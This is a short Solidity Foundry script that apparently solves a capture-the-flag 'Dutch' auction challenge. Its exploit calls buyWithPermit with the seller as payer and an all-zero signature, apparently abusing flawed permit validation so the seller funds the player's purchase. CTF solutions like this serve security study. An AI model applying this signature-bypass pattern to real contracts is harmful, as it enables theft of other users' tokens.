pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";

import {Challenge} from "src/Challenge.sol";
import {IAuction} from "src/interfaces/IAuction.sol";

contract DutchSolver is CTFSolver {
    Challenge private challenge;
    IAuction private iAuction;

    address private system;
    address private player;

    function solve(address _challenge, address _player) internal override {
        challenge = Challenge(_challenge);
        iAuction = IAuction(challenge.auction());
        player = _player;
        system = iAuction.seller();

        _exploit();
    }

    function _exploit() private {
        iAuction.buyWithPermit(system, player, 1 ether, 0, 0, bytes32(0), bytes32(0));
    }
}
